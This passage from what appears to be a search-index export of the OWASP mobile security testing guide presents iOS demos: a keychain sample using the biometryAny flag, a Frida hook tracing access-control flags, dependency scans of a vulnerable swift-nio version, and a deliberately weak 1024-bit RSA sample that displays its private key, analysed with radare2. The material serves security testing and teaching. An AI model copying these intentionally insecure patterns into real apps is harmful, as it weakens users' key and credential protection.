ACL flags\n    // 1a. Create an access\u2010control object requiring user presence\n    guard let accessControl = SecAccessControlCreateWithFlags(\n      nil,\n      kSecAttrAccessibleWhenUnlocked,\n      .biometryAny,\n      nil\n    ) else {\n      completion(\"\u274c Failed to create access control\")\n      return\n    }\n\n    // 1b. Build your add\u2010item query\n    // Optional: you may provide a customized context to alter the default config, e.g. to set a \"reuse duration\".\n    // See https://developer.apple.com/documentation/localauthentication/accessing-keychain-items-with-face-id-or-touch-id#Optionally-Provide-a-Customized-Context\n    // Keychain services automatically makes use of the LocalAuthentication framework, even if you don't provide one.\n    //\n    //  let context = LAContext()\n    //  context.touchIDAuthenticationAllowableReuseDuration = 10\n    let storeQuery: [String: Any] = [\n      kSecClass as String:          kSecClassGenericPassword,\n      kSecAttrAccount as String:    account,\n      kSecValueData as String:      tokenData,\n      kSecAttrAccessControl as String: accessControl,\n      // kSecUseAuthenticationContext as String: context,\n    ]\n\n    // Before adding, we delete any existing item\n    SecItemDelete(storeQuery as CFDictionary)\n    let storeStatus = SecItemAdd(storeQuery as CFDictionary, nil)\n    guard storeStatus == errSecSuccess else {\n      completion(\"\u274c Failed to store token in Keychain (status \\(storeStatus))\")\n      return\n    }\n\n    // 2. Now let's retrieve the token\n    // Optional: you may provide a context with a localized reason.\n    // See https://developer.apple.com/documentation/localauthentication/accessing-keychain-items-with-face-id-or-touch-id#Provide-a-Prompt-When-Reading-the-Item\n    // Keychain services will use LAContext to prompt the user even if you don't provide one.\n    //\n    // let context = LAContext()\n    // context.localizedReason = \"Access your token from the keychain\"\n    let fetchQuery: [String: Any] = [\n      kSecClass as String:         kSecClassGenericPassword,\n      kSecAttrAccount as String:   account,\n      kSecReturnData as String:    true,\n      kSecMatchLimit as String:    kSecMatchLimitOne,\n      //kSecUseAuthenticationContext as String: context,\n    ]\n\n    var result: CFTypeRef?\n    let fetchStatus = SecItemCopyMatching(fetchQuery as CFDictionary, &amp;result)\n\n    if fetchStatus == errSecSuccess,\n       let data = result as? Data,\n       let token = String(data: data, encoding: .utf8) {\n      completion(\"\u2705 Retrieved token: \\(token)\")\n    } else {\n      completion(\"\u274c Authentication failed or token inaccessible (status \\(fetchStatus))\")\n    }\n  }\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0271"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0046/MASTG-DEMO-0046/#steps","title":"Steps","text":"<ol> <li>Install the app on a device ( Installing Apps)</li> <li>Make sure you have  Frida for iOS installed on your machine and the frida-server running on the device</li> <li>Run <code>run.sh</code> to spawn your app with Frida</li> <li>Click the Start button</li> <li>Stop the script by pressing <code>Ctrl+C</code></li> </ol> run.shscript.js <pre><code>#!/bin/bash\nfrida -U -f org.owasp.mastestapp.MASTestApp-iOS -l ../MASTG-DEMO-0044/script.js -o output.txt\n</code></pre> <pre><code>const AccessControlFlags = {\n    kSecAccessControlUserPresence: 1 &lt;&lt; 0,\n    kSecAccessControlBiometryAny: 1 &lt;&lt; 1,\n    kSecAccessControlBiometryCurrentSet: 1 &lt;&lt; 3,\n    kSecAccessControlDevicePasscode: 1 &lt;&lt; 4,\n    kSecAccessControlWatch: 1 &lt;&lt; 5,\n    kSecAccessControlOr: 1 &lt;&lt; 14,\n    kSecAccessControlAnd: 1 &lt;&lt; 15,\n    kSecAccessControlPrivateKeyUsage: 1 &lt;&lt; 30,\n    kSecAccessControlApplicationPassword: 1 &lt;&lt; 31,\n  };\n\n\nInterceptor.attach(Module.getGlobalExportByName('SecAccessControlCreateWithFlags'), {\n    /* \n        func SecAccessControlCreateWithFlags(\n        _ allocator: CFAllocator?,\n        _ protection: CFTypeRef,\n        _ flags: SecAccessControlCreateFlags,\n        _ error: UnsafeMutablePointer&lt;Unmanaged&lt;CFError&gt;?&gt;?\n        )  -&gt; SecAccessControl?\n    */\n  onEnter(args) {\n    const flags = args[2]\n    const flags_description = parseAccessControlFlags(flags)\n    console.log(`\\SecAccessControlCreateWithFlags(..., 0x${flags.toString(16)}) called with ${flags_description}\\n`)\n\n      // Use an arrow function so that `this` remains the same as in onEnter\n      const printBacktrace = (maxLines = 8) =&gt; {\n          console.log(\"\\nBacktrace:\");\n          let backtrace = Thread.backtrace(this.context, Backtracer.ACCURATE)\n              .map(DebugSymbol.fromAddress);\n\n          for (let i = 0; i &lt; Math.min(maxLines, backtrace.length); i++) {\n              console.log(backtrace[i]);\n          }\n      }\n      printBacktrace();\n  }\n});\n\n\nfunction parseAccessControlFlags(value) {\n    const result = [];\n    for (const [name, bit] of Object.entries(AccessControlFlags)) {\n      if ((value &amp; bit) === bit) {\n        result.push(name);\n      }\n    }\n    return result;\n  }\n</code></pre>","tags":["ios","demo","MASTG-TEST-0271"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0046/MASTG-DEMO-0046/#observation","title":"Observation","text":"output.txt<pre><code>SecAccessControlCreateWithFlags(..., 0x2) called with kSecAccessControlBiometryAny\n\nBacktrace:\n0x102350198 MASTestApp!specialized static MastgTest.createAccessControl()\n0x1023504b0 MASTestApp!specialized static MastgTest.storeTokenInKeychain(secretToken:)\n0x102351b98 MASTestApp!closure #1 in closure #1 in closure #1 in ContentView.body.getter\n0x19908bc54 SwiftUI!partial apply for closure #1 in closure #2 in ContextMenuBridge.contextMenuInteraction(_:willPerformPreviewActionForMenuWith:animator:)\n0x198f986d0 SwiftUI!partial apply for specialized thunk for @callee_guaranteed () -&gt; (@out A, @error @owned Error)\n0x1996657c4 SwiftUI!specialized static MainActor.assumeIsolated&lt;A&gt;(_:file:line:)\n0x1996321a8 SwiftUI!ButtonAction.callAsFunction()\n0x198b14c2c SwiftUI!partial apply for implicit closure #2 in implicit closure #1 in PlatformItemListButtonStyle.makeBody(configuration:)\n</code></pre> <p>The output reveals the use of <code>SecAccessControlCreateWithFlags</code> in the app and lists all used flags.</p>","tags":["ios","demo","MASTG-TEST-0271"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0046/MASTG-DEMO-0046/#evaluation","title":"Evaluation","text":"<p>The test fails because the output shows the runtime use of <code>SecAccessControlCreateWithFlags</code> with <code>kSecAccessControlBiometryAny</code> (see LAPublicDefines.h), which accepts any additional biometrics added after the Keychain entry was created.</p> <p>When it is required that the associated keychain item become inaccessible when changes are made to the biometric database (e.g., when a new fingerprint or face is added), the app must use the<code>kSecAccessControlBiometryCurrentSet</code> flag instead.</p>","tags":["ios","demo","MASTG-TEST-0271"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0047/MASTG-DEMO-0047/","title":"MASTG-DEMO-0047: Runtime Use of the Keychain Not Requiring User Presence with Frida","text":"<p>Placeholder MASTG-DEMO</p> <p>This demo hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that demo by following our guidelines.</p> <p> Check our GitHub Issues for MASTG-DEMO-0047</p> <p>If an issue doesn't exist yet, please create one and assign it to yourself or request to be assigned to it.</p>","tags":["ios","demo","placeholder","MASTG-TEST-0266"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0047/MASTG-DEMO-0047/#draft-description","title":"Draft Description","text":"<p>This demo shows how to store sensitive data insecurely in the Keychain by not requiring user presence (e.g., biometrics).</p> <p>For more details, check the associated test:  References to APIs for Event-Bound Biometric Authentication</p>","tags":["ios","demo","placeholder","MASTG-TEST-0266"]},{"location":"MASTG/demos/ios/MASVS-CODE/MASTG-DEMO-0052/MASTG-DEMO-0052/","title":"MASTG-DEMO-0052: Scanning Package Manager Artifacts for Insecure iOS Dependencies","text":"<p>  Download MASTG-DEMO-0052 IPA   Open MASTG-DEMO-0052 Folder  Build MASTG-DEMO-0052 IPA</p>","tags":["ios","demo","MASTG-TEST-0273"]},{"location":"MASTG/demos/ios/MASVS-CODE/MASTG-DEMO-0052/MASTG-DEMO-0052/#sample","title":"Sample","text":"Package.resolvedPackage.resolved <pre><code>{\n  \"originHash\" : \"b68c973e78e301de37753c919a62c1dda9a70e82a8dbd432336372a4edf9b951\",\n  \"pins\" : [\n    {\n      \"identity\" : \"swift-nio\",\n      \"kind\" : \"remoteSourceControl\",\n      \"location\" : \"https://github.com/apple/swift-nio.git\",\n      \"state\" : {\n        \"revision\" : \"6aa9347d9bc5bbfe6a84983aec955c17ffea96ef\",\n        \"version\" : \"2.33.0\"\n      }\n    }\n  ],\n  \"version\" : 3\n}\n</code></pre> <pre><code>{\n  \"originHash\" : \"b68c973e78e301de37753c919a62c1dda9a70e82a8dbd432336372a4edf9b951\",\n  \"pins\" : [\n    {\n      \"identity\" : \"swift-nio\",\n      \"kind\" : \"remoteSourceControl\",\n      \"location\" : \"https://github.com/apple/swift-nio.git\",\n      \"state\" : {\n        \"revision\" : \"6aa9347d9bc5bbfe6a84983aec955c17ffea96ef\",\n        \"version\" : \"2.33.0\"\n      }\n    }\n  ],\n  \"version\" : 3\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0273"]},{"location":"MASTG/demos/ios/MASVS-CODE/MASTG-DEMO-0052/MASTG-DEMO-0052/#steps","title":"Steps","text":"<p>Let's run  dependency-check in the root directory of the Xcode project.</p> run.sh<pre><code>$NVD_API_KEY=\"YOUR_NVD_API\"\ndependency-check --enableExperimental -f SARIF --nvdApiKey $NVD_API_KEY -s Package.resolved\n</code></pre>","tags":["ios","demo","MASTG-TEST-0273"]},{"location":"MASTG/demos/ios/MASVS-CODE/MASTG-DEMO-0052/MASTG-DEMO-0052/#observation","title":"Observation","text":"<p>The SARIF file can be opened by using  Visual Studio Code (vscode) for analyzing the identified vulnerabilities.</p> output.txt<pre><code>{\n    \"$schema\": \"https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json\",\n    \"version\": \"2.1.0\",\n    \"runs\": [\n        {\n            \"tool\": {\n                \"driver\": {\n                    \"name\": \"dependency-check\",\n                    \"version\": \"10.0.4\",\n                    \"informationUri\": \"https://jeremylong.github.io/DependencyCheck/\",\n                    \"rules\": [\n                        {\n                            \"id\": \"CVE-2020-9861\",\n                            \"shortDescription\": {\n                                \"text\": \"high severity - CVE-2020-9861 Uncontrolled Recursion vulnerability in pkg:swift\\/swift-nio@2.33.0\"\n                            },\n                            \"fullDescription\": {\n                                \"text\": \"A stack overflow issue existed in Swift for Linux. The issue was addressed with improved input validation for dealing with deeply nested malicious JSON input.\"\n                            },\n                            \"help\": {\n                                \"text\": \"\",\n                                \"markdown\": \"For more information see [CVE-2020-9861](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-9861).\\n\\n\\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://jeremylong.github.io/DependencyCheck/general/internals.html), [How to read the HTML report](https://jeremylong.github.io/DependencyCheck/general/thereport.html), and [Suppressing false positives](https://jeremylong.github.io/DependencyCheck/general/suppression.html).\"\n                            },\n                            \"properties\": {\n                                \"cvssv2_score\": 5.0,\n                                \"cvssv2_accessVector\": \"NETWORK\",\n                                \"cvssv2_accessComplexity\": \"LOW\",\n                                \"cvssv2_authenticationr\": \"NONE\",\n                                \"cvssv2_confidentialityImpact\": \"NONE\",\n                                \"cvssv2_integrityImpact\": \"NONE\",\n                                \"cvssv2_availabilityImpact\": \"PARTIAL\",\n                                \"cvssv2_severity\": \"MEDIUM\",\n                                \"cvssv3_baseScore\": 7.5,\n                                \"security-severity\": \"7.5\",\n                                \"cvssv3_attackVector\": \"NETWORK\",\n                                \"cvssv3_attackComplexity\": \"LOW\",\n                                \"cvssv3_privilegesRequired\": \"NONE\",\n                                \"cvssv3_userInteraction\": \"NONE\",\n                                \"cvssv3_scope\": \"UNCHANGED\",\n                                \"cvssv3_confidentialityImpact\": \"NONE\",\n                                \"cvssv3_integrityImpact\": \"NONE\",\n                                \"cvssv3_availabilityImpact\": \"HIGH\",\n                                \"cvssv3_baseSeverity\": \"HIGH\",\n                                \"cvssv3_exploitabilityScore\": \"3.9\",\n                                \"cvssv3_impactScore\": \"3.6\",\n                                \"cvssv3_version\": \"_3_1\",\n                                \"source\": \"NVD\"\n                            }\n                        },\n                        {\n                            \"id\": \"CVE-2022-1642\",\n                            \"shortDescription\": {\n                                \"text\": \"high severity - CVE-2022-1642 Incorrect Type Conversion or Cast vulnerability in pkg:swift\\/swift-nio@2.33.0\"\n                            },\n                            \"fullDescription\": {\n                                \"text\": \"A program using swift-corelibs-foundation is vulnerable to a denial of service attack caused by a potentially malicious source producing a JSON document containing a type mismatch. This vulnerability is caused by the interaction between a deserialization mechanism offered by the Swift standard library, the Codable protocol; and the JSONDecoder class offered by swift-corelibs-foundation, which can deserialize types that adopt the Codable protocol based on the content of a provided JSON document. When a type that adopts Codable requests the initialization of a field with an integer value, the JSONDecoder class uses a type-erased container with different accessor methods to attempt and coerce a corresponding JSON value and produce an integer. In the case the JSON value was a numeric literal with a floating-point portion, JSONDecoder used different type-eraser methods during validation than it did during the final casting of the value. The checked casting produces a deterministic crash due to this mismatch. The JSONDecoder class is often wrapped by popular Swift-based web frameworks to parse the body of HTTP requests and perform basic type validation. This makes the attack low-effort: sending a specifically crafted JSON document during a request to these endpoints will cause them to crash. The attack does not have any confidentiality or integrity risks in and of itself; the crash is produced deterministically by an abort function that ensures that execution does not continue in the face of this violation of assumptions. However, unexpected crashes can lead to violations of invariants in services, so it's possible that this attack can be used to trigger error conditions that escalate the risk. Producing a denial of service may also be the goal of an attacker in itself. This issue is solved in Swift 5.6.2 for Linux and Windows. This issue was solved by ensuring that the same methods are invoked both when validating and during casting, so that no type mismatch occurs. Swift for Linux and Windows versions are not ABI-interchangeable. To upgrade a service, its owner must update to this version of the Swift toolchain, then recompile and redeploy their software. The new version of Swift includes an updated swift-corelibs-foundation package. Versions of Swift running on Darwin-based operating systems are not affected.\"\n                            },\n                            \"help\": {\n                                \"text\": \"\",\n                                \"markdown\": \"For more information see [CVE-2022-1642](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2022-1642).\\n\\n\\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://jeremylong.github.io/DependencyCheck/general/internals.html), [How to read the HTML report](https://jeremylong.github.io/DependencyCheck/general/thereport.html), and [Suppressing false positives](https://jeremylong.github.io/DependencyCheck/general/suppression.html).\"\n\n                            }\n...[REDACTED]...\n</code></pre>","tags":["ios","demo","MASTG-TEST-0273"]},{"location":"MASTG/demos/ios/MASVS-CODE/MASTG-DEMO-0052/MASTG-DEMO-0052/#evaluation","title":"Evaluation","text":"<p>Review each of the reported instances, as it can contain false positives. The library <code>swift-nio</code> has at least 2 known vulnerabilities as part of Swift with CVE-2022-3918 and CVE-2022-1642 and should be updated to the latest version.</p>","tags":["ios","demo","MASTG-TEST-0273"]},{"location":"MASTG/demos/ios/MASVS-CODE/MASTG-DEMO-0053/MASTG-DEMO-0053/","title":"MASTG-DEMO-0053: Identifying Insecure Dependencies in SwiftPM through SBOM creation","text":"<p>  Download MASTG-DEMO-0053 IPA   Open MASTG-DEMO-0053 Folder  Build MASTG-DEMO-0053 IPA</p>","tags":["ios","demo","MASTG-TEST-0273"]},{"location":"MASTG/demos/ios/MASVS-CODE/MASTG-DEMO-0053/MASTG-DEMO-0053/#steps","title":"Steps","text":"<p>Execute  cdxgen in the root directory of the Xcode project.</p> run.sh<pre><code>cdxgen -o sbom.json\n</code></pre> <p>This will create a SBOM file that can be uploaded to  dependency-track by following  Software Composition Analysis (SCA) of iOS Dependencies by Creating a SBOM.</p>","tags":["ios","demo","MASTG-TEST-0273"]},{"location":"MASTG/demos/ios/MASVS-CODE/MASTG-DEMO-0053/MASTG-DEMO-0053/#observation","title":"Observation","text":"<p>In the project of  dependency-track, where the SBOM has been uploaded, the scan should have identified 2 unique dependencies (components) with 2 vulnerable dependencies and 2 vulnerabilities (as more vulnerabilities might be found over time this number might increase).</p> output.txt<pre><code>{\n    \"bomFormat\": \"CycloneDX\",\n    \"specVersion\": \"1.5\",\n    \"serialNumber\": \"urn:uuid:54c73891-97b0-40be-90a1-a432ffc62330\",\n    \"version\": 1,\n    \"metadata\": {\n        \"timestamp\": \"2024-10-20T17:34:54Z\",\n        \"tools\": {\n            \"components\": [\n                {\n                    \"group\": \"@cyclonedx\",\n                    \"name\": \"cdxgen\",\n                    \"version\": \"10.10.5\",\n                    \"purl\": \"pkg:npm/%40cyclonedx/cdxgen@10.10.5\",\n                    \"type\": \"application\",\n                    \"bom-ref\": \"pkg:npm/@cyclonedx/cdxgen@10.10.5\",\n                    \"author\": \"OWASP Foundation\",\n                    \"publisher\": \"OWASP Foundation\"\n                }\n            ]\n        },\n        \"authors\": [\n            {\n                \"name\": \"OWASP Foundation\"\n            }\n        ],\n        \"lifecycles\": [\n            {\n                \"phase\": \"build\"\n            }\n        ],\n        \"component\": {\n            \"group\": \"\",\n            \"name\": \"MASTestApp-iOS-MASWE-0076\",\n            \"version\": \"latest\",\n            \"type\": \"application\",\n            \"bom-ref\": \"pkg:swift/MASTestApp-iOS-MASWE-0076@latest\",\n            \"purl\": \"pkg:swift/MASTestApp-iOS-MASWE-0076@latest\"\n        },\n        \"properties\": [\n            {\n                \"name\": \"cdx:bom:componentTypes\",\n                \"value\": \"github\\\\nswift\"\n            },\n            {\n                \"name\": \"cdx:bom:componentNamespaces\",\n                \"value\": \"actions\\\\ngithub.com/apple\"\n            }\n        ]\n    },\n    \"components\": [\n        {\n            \"group\": \"actions\",\n            \"name\": \"checkout\",\n            \"version\": \"v4\",\n            \"purl\": \"pkg:github/actions/checkout@v4\",\n            \"type\": \"application\",\n            \"bom-ref\": \"pkg:github/actions/checkout@v4\"\n        },\n        {\n            \"group\": \"github.com/apple\",\n            \"name\": \"swift-nio\",\n            \"version\": \"1.4.0\",\n            \"purl\": \"pkg:swift/github.com/apple/swift-nio@1.4.0\",\n            \"externalReferences\": [\n                {\n                    \"type\": \"vcs\",\n                    \"url\": \"https://github.com/apple/swift-nio.git\"\n                }\n            ],\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:swift/github.com/apple/swift-nio@1.4.0\",\n            \"evidence\": {\n                \"identity\": {\n                    \"field\": \"purl\",\n                    \"confidence\": 1,\n                    \"methods\": [\n                        {\n                            \"technique\": \"manifest-analysis\",\n                            \"confidence\": 1,\n                            \"value\": \"/Users/sushi2k/Documents/mastg-apps/MASTestApp-iOS-MASWE-0076/MASTestApp.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved\"\n                        }\n                    ]\n                }\n            },\n            \"properties\": [\n                {\n                    \"name\": \"SrcFile\",\n                    \"value\": \"/Users/sushi2k/Documents/mastg-apps/MASTestApp-iOS-MASWE-0076/MASTestApp.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved\"\n                }\n            ]\n        },\n        {\n            \"group\": \"github.com/apple\",\n            \"name\": \"swift-nio-zlib-support\",\n            \"version\": \"1.0.0\",\n            \"purl\": \"pkg:swift/github.com/apple/swift-nio-zlib-support@1.0.0\",\n            \"externalReferences\": [\n                {\n                    \"type\": \"vcs\",\n                    \"url\": \"https://github.com/apple/swift-nio-zlib-support.git\"\n                }\n            ],\n            \"type\": \"library\",\n            \"bom-ref\": \"pkg:swift/github.com/apple/swift-nio-zlib-support@1.0.0\",\n            \"evidence\": {\n                \"identity\": {\n                    \"field\": \"purl\",\n                    \"confidence\": 1,\n                    \"methods\": [\n                        {\n                            \"technique\": \"manifest-analysis\",\n                            \"confidence\": 1,\n                            \"value\": \"/Users/sushi2k/Documents/mastg-apps/MASTestApp-iOS-MASWE-0076/MASTestApp.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved\"\n                        }\n                    ]\n                }\n            },\n            \"properties\": [\n                {\n                    \"name\": \"SrcFile\",\n                    \"value\": \"/Users/sushi2k/Documents/mastg-apps/MASTestApp-iOS-MASWE-0076/MASTestApp.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved\"\n                }\n            ]\n        }\n    ],\n    \"services\": [],\n    \"dependencies\": []\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0273"]},{"location":"MASTG/demos/ios/MASVS-CODE/MASTG-DEMO-0053/MASTG-DEMO-0053/#evaluation","title":"Evaluation","text":"<p>Review each of the reported instances. The dependency <code>swift-nio</code> has 2 known vulnerabilities and should be updated to the latest version.</p>","tags":["ios","demo","MASTG-TEST-0273"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0011/MASTG-DEMO-0011/","title":"MASTG-DEMO-0011: Uses of Insufficient Key Size in SecKeyCreateRandomKey with r2","text":"<p>  Download MASTG-DEMO-0011 IPA   Open MASTG-DEMO-0011 Folder  Build MASTG-DEMO-0011 IPA</p>","tags":["ios","demo","MASTG-TEST-0209"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0011/MASTG-DEMO-0011/#sample","title":"Sample","text":"<p>The following sample demonstrates the use of <code>SecKeyCreateRandomKey</code> to generate an RSA key pair with a 1024-bit key size. The key pair is then used to sign and verify a message.</p> MastgTest.swift<pre><code>import Foundation\nimport Security\n\nstruct MastgTest {\n    static func mastgTest(completion: @escaping (String) -&gt; Void) {\n\n        // Step 1: Generate an RSA key pair with a 1024-bit key size\n        let tag = \"org.owasp.mas.rsa-1014\".data(using: .utf8)!\n        let keyAttributes: [String: Any] = [\n            kSecAttrKeyType as String: kSecAttrKeyTypeRSA,\n            kSecAttrKeySizeInBits as String: 1024,  // Using 1024-bit RSA key\n            kSecPrivateKeyAttrs as String:\n               [kSecAttrIsPermanent as String:    true,     // to store it in the Keychain\n                kSecAttrApplicationTag as String: tag]      // to find and retrieve it from the Keychain later\n        ]\n\n        var error: Unmanaged&lt;CFError&gt;?\n        guard let privateKey = SecKeyCreateRandomKey(keyAttributes as CFDictionary, &amp;error) else {\n            completion(\"Failed to generate private key: \\(String(describing: error))\")\n            return\n        }\n\n        guard let publicKey = SecKeyCopyPublicKey(privateKey) else {\n            completion(\"Failed to generate public key\")\n            return\n        }\n\n        // Convert the private key to data (DER format)\n        guard let privateKeyData = SecKeyCopyExternalRepresentation(privateKey, &amp;error) as Data? else {\n            completion(\"Failed to extract private key: \\(String(describing: error))\")\n            return\n        }\n\n        // Encode the private key for display\n        //let privateKeyBase64 = privateKeyData.base64EncodedString()\n        let privateKeyHex = privateKeyData.map { String(format: \"%02hhx\", $0) }.joined()\n\n        // Convert the public key to data (DER format)\n        guard let publicKeyData = SecKeyCopyExternalRepresentation(publicKey, &amp;error) as Data? else {\n            completion(\"Failed to extract public key: \\(String(describing: error))\")\n            return\n        }\n\n        // Encode the public key for display\n        // let publicKeyBase64 = publicKeyData.base64EncodedString()\n        let publicKeyHex = publicKeyData.map { String(format: \"%02hhx\", $0) }.joined()\n\n        // Data to sign\n        let dataToSign = \"This is a sample text\".data(using: .utf8)!\n\n        // Step 2: Sign the data with the private key\n        guard let signature = SecKeyCreateSignature(\n            privateKey,\n            SecKeyAlgorithm.rsaSignatureMessagePKCS1v15SHA256,\n            dataToSign as CFData,\n            &amp;error\n        ) else {\n            completion(\"Signing failed: \\(String(describing: error))\")\n            return\n        }\n\n        // Convert signature to hex string for display\n        let signatureHex = (signature as Data).map { String(format: \"%02hhx\", $0) }.joined()\n\n        // Step 3: Verify the signature with the public key\n        let verificationStatus = SecKeyVerifySignature(\n            publicKey,\n            SecKeyAlgorithm.rsaSignatureMessagePKCS1v15SHA256,\n            dataToSign as CFData,\n            signature as CFData,\n            &amp;error\n        )\n\n        let verificationResult = verificationStatus ? \"Signature is valid.\" : \"Signature is invalid.\"\n\n        let value = \"\"\"\n        Original: \\(String(data: dataToSign, encoding: .utf8)!)\n\n        Private Key (Hex): \\(privateKeyHex)\n\n        Public Key (Hex): \\(publicKeyHex)\n\n        Signature (Hex): \\(signatureHex)\n\n        Verification: \\(verificationResult)\n        \"\"\"\n\n        completion(value)\n    }\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0209"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0011/MASTG-DEMO-0011/#steps","title":"Steps","text":"<p>When calling <code>SecKeyCreateRandomKey</code> the key size is specified in the <code>kSecAttrKeySizeInBits</code> attribute within the <code>parameters</code> dictionary. See Key Generation Attributes for details.</p> <ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Open the app binary with  radare2 for iOS with the <code>-i</code> option to run this script.</li> </ol> security_keysize.r2<pre><code>?e;?e\n\n?e Uses of SecKeyCreateRandomKey:\nafl~SecKeyCreateRandomKey\n\n?e\n\n?e xrefs to SecKeyCreateRandomKey:\naxt @ 0x1000078ac\n\n?e\n\n?e Use of reloc.kSecAttrKeySizeInBits as input for SecKeyCreateRandomKey:\npd 1 @ sym.func.1000046f8\n\n?e ...\n\npd 9 @ 0x10000484c\n\n?e ...\n\npd-- 2 @ 0x1000049a0\n</code></pre> run.sh<pre><code>r2 -q -i security_keysize.r2 -A MASTestApp\n</code></pre>","tags":["ios","demo","MASTG-TEST-0209"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0011/MASTG-DEMO-0011/#observation","title":"Observation","text":"<p>The output contains the disassembled code of the function using <code>SecKeyCreateRandomKey</code>.</p> output.txt<pre><code>Uses of SecKeyCreateRandomKey:\n0x1000078ac    1     12 sym.imp.SecKeyCreateRandomKey\n\nxrefs to SecKeyCreateRandomKey:\nsym.func.1000046f8 0x1000049a0 [CALL:--x] bl sym.imp.SecKeyCreateRandomKey\n\nUse of reloc.kSecAttrKeySizeInBits as input for SecKeyCreateRandomKey:\n            ; CALL XREF from sym.func.1000063a0 @ 0x1000063d8(x)\n\u250c 2920: sym.func.1000046f8 (int64_t arg1, void *arg2, void *arg3);\n\u2502           ; arg int64_t arg1 @ x0\n\u2502           ; arg void *arg2 @ x1\n\u2502           ; arg void *arg3 @ x2\n\u2502           ; var void *var_0h @ sp+0x0\n\u2502           ; var int64_t var_0h_14 @ sp+0x8\n\u2502           ; var int64_t var_10h @ sp+0x10\n\u2502           ; var int64_t var_10h_4 @ sp+0x18\n\u2502           ; var void *var_20h @ sp+0x20\n\u2502           ; var int64_t var_28h @ sp+0x28\n\u2502           ; var int64_t var_30h @ sp+0x30\n\u2502           ; var int64_t var_0h_12 @ sp+0x38\n\u2502           ; var int64_t var_40h @ sp+0x40\n\u2502           ; var int64_t var_0h_13 @ sp+0x48\n\u2502           ; var void *var_50h_2 @ sp+0x50\n\u2502           ; var int64_t var_0h_10 @ sp+0x58\n\u2502           ; var int64_t var_0h_9 @ sp+0x60\n\u2502           ; var void *var_0h_11 @ sp+0x68\n\u2502           ; var int64_t var_0h_5 @ sp+0x70\n\u2502           ; var int64_t var_0h_4 @ sp+0x78\n\u2502           ; var int64_t var_80h @ sp+0x80\n\u2502           ; var int64_t var_80h_2 @ sp+0x88\n\u2502           ; var int64_t var_0h_2 @ sp+0x90\n\u2502           ; var void *var_98h @ sp+0x98\n\u2502           ; var void *var_98h_2 @ sp+0xa0\n\u2502           ; var int64_t var_0h_7 @ sp+0xb0\n\u2502           ; var int64_t var_b0h @ sp+0xb8\n\u2502           ; var void *var_c0h @ sp+0xc0\n\u2502           ; var void *arg0 @ sp+0xc8\n\u2502           ; var int64_t var_0h_8 @ sp+0xd0\n\u2502           ; var int64_t var_0h_6 @ sp+0xd8\n\u2502           ; var void *var_e0h @ sp+0xe0\n\u2502           ; var void *var_160h @ sp+0x160\n\u2502           ; var int64_t var_0h_3 @ sp+0x210\n\u2502           ; var int64_t var_60h @ sp+0x220\n\u2502           ; var int64_t var_60h_2 @ sp+0x228\n\u2502           ; var int64_t var_10h_2 @ sp+0x230\n\u2502           ; var int64_t var_10h_3 @ sp+0x238\n\u2502           ; var int64_t var_20h_2 @ sp+0x240\n\u2502           ; var int64_t var_20h_3 @ sp+0x248\n\u2502           ; var int64_t var_30h_2 @ sp+0x250\n\u2502           ; var int64_t var_30h_3 @ sp+0x258\n\u2502           ; var int64_t var_40h_2 @ sp+0x260\n\u2502           ; var int64_t var_40h_3 @ sp+0x268\n\u2502           ; var int64_t var_50h @ sp+0x270\n\u2502           ; var int64_t var_50h_3 @ sp+0x278\n\u2502           0x1000046f8      fc6fbaa9       stp x28, x27, [sp, -0x60]!\n...\n\u2502           0x10000484c      080942f9       ldr x8, reloc.kSecAttrKeySizeInBits ; 0x10000c410\n\u2502           0x100004850      000140f9       ldr x0, [x8]\n\u2502           0x100004854      e30b0094       bl fcn.1000077e0\n\u2502           0x100004858      800605a9       stp x0, x1, [x20, 0x50]\n\u2502           0x10000485c      48000090       adrp x8, reloc.Foundation.__DataStorage._bytes.allocator__UnsafeMutableRawPointer______ ; 0x10000c000\n\u2502           0x100004860      089d41f9       ldr x8, reloc.Swift.Int    ; 0x10000c338\n\u2502           0x100004864      883e00f9       str x8, [x20, 0x78]\n\u2502           0x100004868      08808052       mov w8, 0x400\n\u2502           0x10000486c      883200f9       str x8, [x20, 0x60]\n...\n\u2502           0x100004998      f40300aa       mov x20, x0\n\u2502           0x10000499c      61620391       add x1, x19, 0xd8\n\u2502           0x1000049a0      c30b0094       bl sym.imp.SecKeyCreateRandomKey\n\u2502           0x1000049a4      fb0300aa       mov x27, x0\n</code></pre> <p>This function is pretty big so we just included the relevant part of the code that's right before the call to <code>SecKeyCreateRandomKey</code>. Note that we can see attributes being set in the <code>parameters</code> dictionary such as <code>kSecAttrKeySizeInBits</code> as <code>reloc.kSecAttrKeySizeInBits</code>. In radare2, this means that the symbol <code>kSecAttrKeySizeInBits</code> is not directly referenced by an absolute address but rather through a relocation entry. This entry 